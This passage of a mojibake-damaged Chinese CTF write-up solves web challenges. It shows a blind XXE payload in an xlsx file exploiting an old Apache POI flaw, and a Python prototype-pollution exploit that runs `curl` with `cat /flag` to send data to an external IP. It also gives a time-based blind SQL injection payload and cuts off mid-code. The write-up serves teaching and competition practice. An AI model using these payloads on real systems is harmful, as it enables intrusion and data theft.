class="string">"/ListFileServlet"</span>).forward(request, response);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makeFileName</span><span class="params">(String filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> StringBuilder()).append(UUID.randomUUID().toString()).append(<span class="string">"_"</span>).append(filename).toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makePath</span><span class="params">(String filename, String savePath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">        <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">0xf</span>;</span><br><span class="line">        <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        String dir = (<span class="keyword">new</span> StringBuilder()).append(savePath).append(<span class="string">"/"</span>).append(dir1).append(<span class="string">"/"</span>).append(dir2).toString();</span><br><span class="line">        File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">        <span class="keyword">if</span>(!file.exists())</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®è¯è¯´,ç¬¬ä¸€æ­¥è¯»å®Œåçœ‹äº†çœ¼æ‰€æœ‰çš„æºç ã€‚æ²¡çœ‹å‡ºä»€ä¹ˆç«¯å€ªã€‚(å…¶å®æ˜¯çœ‹æ¼äº†)<br>ç¬¬ä¸€æƒ³æ³•æ˜¯å¹½çµçŒ«ã€‚ä½†æ˜¯é—®äº†ä¸‹é˜Ÿå‹è¯´8009ç«¯å£ä¸æ˜¯å¼€çš„å°±ä½œç½¢ã€‚<br>ç„¶åæƒ³åˆ©ç”¨åˆšåˆšçš„ä»»æ„æ–‡ä»¶ä¸‹è½½è¯»flag.å´å‘ç°è¢«å®šä½åˆ°404äº†ã€‚ä»”ç»†çœ‹æºç ä¼šå‘ç°<br>DownloadServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">"flag"</span>))</span><br><span class="line">       &#123;</span><br><span class="line">           request.setAttribute(<span class="string">"message"</span>, <span class="string">"\u7981\u6B62\u8BFB\u53D6"</span>);</span><br><span class="line">           request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward(request, response);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>æœç„¶è¿‡æ»¤äº†å…³é”®å­—ã€‚éœ€è¦å…¶ä»–æ–¹æ³•è¯»flag.</p><p>æ­¤æ—¶å›è¿‡å¤´å‘ç°uploadservletæœ‰ä¸€æ®µçªå…€çš„æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(filename.startsWith(<span class="string">"excel-"</span>) &amp;&amp; <span class="string">"xlsx"</span>.equals(fileExtName))</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">        Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(sheet.getFirstRowNum());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(InvalidFormatException e)</span><br><span class="line">    &#123;</span><br><span class="line">        System.err.println(<span class="string">"poi-ooxml-3.10 has something wrong"</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ç¬¬ä¸€æƒ³æ³•æ˜¯æƒ³åˆ°ä¹‹å‰æ›¾ç»çœ‹è¿‡ä½†æ²¡åšè¿‡çš„swpuctf web5.é‚£é“é¢˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§è¿‡èƒ½ç”¨xlsxæ‰“xxeçš„ç±»å‹ã€‚è€Œå®ƒç”¨åˆ°çš„å°±æ˜¯ä¸€ä¸ªå¾ˆè€çš„cve,CVE-2014-3529.</p><p>è€Œè¿™éƒ¨åˆ†ä»£ç é€»è¾‘è¡¨ç¤ºï¼Œå¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶åæ˜¯excel-å¼€å§‹åŠ ä¸Š.xlsxç»“å°¾ï¼Œå°±ä¼šç”¨poiè§£æxlsxã€‚è€Œè¿™ä¸ªCVEçš„poiç‰ˆæœ¬æ°å¥½æ˜¯<code>poi-ooxml-3.10</code></p><p>é‚£å°±ä¸ç”¨è¯´äº†,å…ˆè¯•ç€æŒ‰æµç¨‹æ„é€ ä¸‹payloadã€‚<br>æ³¨æ„,è¿™é‡Œæ„é€ payloadæ—¶æœ€å¥½åœ¨zipä¸­æ‰“å¼€æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„<code>[Content-Types].xml</code>ã€‚å¦åˆ™å¯èƒ½ä¼šå‡ºé”™ã€‚è¿™æ˜¯æˆ‘å¬åŒå­¦è¯´æ‰çŸ¥é“æœ‰è¿™ç§ç„å­¦é—®é¢˜ã€‚æˆ‘ä¸ªäººæ˜¯å…ˆå°†xlsxæ”¹ä¸ºzip,ç„¶åwinrarç›´æ¥æ‰“å¼€ä¿®æ”¹xmlçš„pocã€‚æœ€åå†æ”¹å›æ¥ã€‚è¿™æ ·åº”è¯¥å°±æ²¡å•¥é—®é¢˜äº†ã€‚</p><p>å‘ç°vpsèƒ½æ”¶åˆ°è¯·æ±‚ã€‚é‚£å°±ç›´æ¥xxeç›²æ‰“ä¸€æŠŠæ¢­äº†ã€‚<br>poc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">try</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxxxxx/1.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%int;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>vpsä¸Šçš„1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payl</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxxxxxxx/?%payl;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›‘å¬80ç«¯å£æ”¶åˆ°flag<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/3.png" class="lazyload" data-srcset="3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><p>è€å®è¯´ä¸€å¼€å§‹å®¡å®Œæºç æ²¡å•¥æ”¶è·ã€‚å¤§æ¦‚çš„æ€è·¯æ˜¯,é¢˜ç›®å·²ç»æœ‰äº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œã€‚é‚£ä¹ˆæˆ‘è¦æ˜¯èƒ½ä¿®æ”¹å®ƒå›ºå®šæ­»çš„å‘½ä»¤å†…å®¹å°±èƒ½ä»»æ„æ‰“äº†ã€‚ä½†æ˜¯è¿™ç§è¾¾æˆè‚¯å®šæ˜¯è¦åŸå‹é“¾æ±¡æŸ“çš„ã€‚æˆ‘æ²¡çœ‹åˆ°<code>merge()</code>ä¹‹ç±»çš„å‡½æ•°å°±æ²¡ç»§ç»­æƒ³äº†</p><p>ç„¶åä¹‹åå‘ç°è¿™é¢˜å±…ç„¶æœ‰åŸé¢˜å‚è€ƒçš„â€¦<br><a href="https://github.com/balsn/ctf_writeup/blob/master/20181124-asisctffinal/README.md#secure-api" target="_blank" rel="noopener">https://github.com/balsn/ctf_writeup/blob/master/20181124-asisctffinal/README.md#secure-api</a><br>ä»”ç»†çœ‹äº†ä¸‹å‘ç°å¥½åƒå‡ ä¹ä¸€æ ·å•Šã€‚åªæœ‰ä¸€ä¸ªundefsafeä¾èµ–çš„åŒºåˆ«.<br>ç„¶åå°±å‘ç°è¿™ä¸ªä¾èµ–æœç„¶å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„é—®é¢˜</p><p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">Prototype Pollution</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure><p>å‚ç…§è¿™ä¸ªä¾‹å­,æˆ‘ä»¬å¾ˆå¿«å°±èƒ½æ‰¾åˆ°åŸå‹é“¾çš„æ±¡æŸ“ç‚¹åœ¨edit_noteè¿™ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">       undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">       undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‰wpçš„payloadæ”¹å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">data=&#123;<span class="string">'raw'</span>:<span class="string">'curl 120.27.246.202/?`cat /flag`'</span>,<span class="string">'id'</span>:<span class="string">'__proto__'</span>,<span class="string">'author'</span>:<span class="string">'byc_404'</span>&#125;</span><br><span class="line">url=<span class="string">'http://bed4f32827b843ca9ad5b763749970dd265f40236d544ada.cloudgame1.ichunqiu.com:8080/'</span></span><br><span class="line">r=s.post(url+<span class="string">'edit_note'</span>,json=data)</span><br><span class="line">print(r.text)</span><br><span class="line">r=s.get(url+<span class="string">"status"</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œidæ±¡æŸ“äº†åç”¨rawæˆ–è€…authorä¸¤ä¸ªå±æ€§éƒ½èƒ½å‘½ä»¤æ‰§è¡Œã€‚å½“ç„¶å› ä¸ºå›æ˜¾çš„åŸå› æˆ‘ä»¬é€‰æ‹©curlå¤–å¸¦æ•°æ®</p><p><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/4.png" class="lazyload" data-srcset="4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h1><p>è¿™é¢˜æ²¡åšå‡ºæ¥ç¡®å®ä¸å¤ªåº”è¯¥ã€‚èµ›åæŒ‰éƒå¸ˆå‚…çš„æ€è·¯æœç„¶ä¸€ä¸‹å°±å‡ºäº†ã€‚ä¸è¿‡ä¹Ÿè¯æ˜sqlé‡Œçš„æŠ€å·§ç¡®å®ä¸å°‘å•Šã€‚</p><p>é¦–å…ˆå½“ç„¶æ˜¯sqlç±»å‹.é¢˜ç›®åªæœ‰ä¸€ä¸ª<code>register_do.php</code>,è€Œæ²¡æœ‰loginçš„åŠŸèƒ½ã€‚<br>æµ‹äº†ä¸€ä¼šåçªç„¶å‘ç°ï¼Œå›æ˜¾å˜æˆäº†<code>WTF???row&gt;20</code>è€Œä¸”ä½ çš„payloadæ€ä¹ˆæ”¹å›æ˜¾éƒ½ä¸€è‡´.<br>é‚£ä¹ˆæ­¤æ—¶å¯ä»¥å¤§è‡´æ¨æ–­ä¸‹ã€‚æˆ‘ä»¬çš„payloadæ˜¯è¢«æ‹¼æ¥è¿›äº†<code>insert into</code>è¯­å¥ã€‚å› æ­¤æ•°æ®åº“çš„è¿”å›ç»“æœæ‰ä¼šå¢å¤šåˆ°ä¸Šé™20ã€‚</p><p>é‚£ä¹ˆé¦–å…ˆçŒœæµ‹ç»“æ„ï¼Œæ„é€ payload<br><code>username=admin&#39;,if(1=1,sleep(5),1))#</code><br>ä¼šå‘ç°è™½ç„¶è¿”å›äº†504ã€‚ä½†æ˜¯çš„ç¡®å¯ä»¥å»¶æ—¶.<br>ç„¶è€Œå†æŒ‰ç…§è¿™ä¸ªæ€è·¯æ„é€ ç›²æ³¨payloadå´å‘ç°æˆ‘ä»¬å¹¶ä¸èƒ½è·‘å‡ºä»€ä¹ˆç»“æœã€‚æ­¤æ—¶å†è®¿é—®<code>register_do.php</code>å‘ç°rowåˆè¶…å‡º20äº†.</p><p>æ‰€ä»¥å…³é”®å°±æ˜¯ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•ä¸å¢åŠ ç»“æœ,åŒæ—¶è¿˜èƒ½å»¶æ—¶ã€‚</p><p>è¿™é‡Œå°±å¾—è†œä¸€æ³¢éƒå¸ˆå‚…äº†ã€‚10åˆ†é’Ÿä¸åˆ°å°±èƒ½å‡ºç»“æœâ€¦<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^if(ascii(substr((select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1),1,1))&#x3D;102,pow(9999,100) or sleep(3),pow(9999,100)),&#39;1&#39;)#</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ²¡æœ‰ä»€ä¹ˆwafã€‚æˆ‘ä»¬å°±æŠŠä¸»ä½“éƒ¨åˆ†å¸¦ä¸Šifå­—å¥è¿›è¡Œæ—¶é—´ç›²æ³¨çš„åˆ¤æ–­ã€‚ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬è®©ç»“æœåŒæ—¶<code>pow(9999,100)</code>ä¹Ÿå°±æ˜¯æŠ¥é”™ä¸€ä¸‹ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ä¸ç”¨æ‹…å¿ƒè¯­å¥æ•°è¶…è¿‡20çš„ä¸Šé™ã€‚</p><p>ç„¶åå‘ç°è¡¨åä¸çŸ¥é“ä¸ºä»€ä¹ˆè·‘ä¸å‡ºæ¥ã€‚ä½†æ˜¯å¯ä»¥ç›´æ¥å°è¯•flagè¡¨ç„¶åæ— åˆ—åæ³¨å…¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 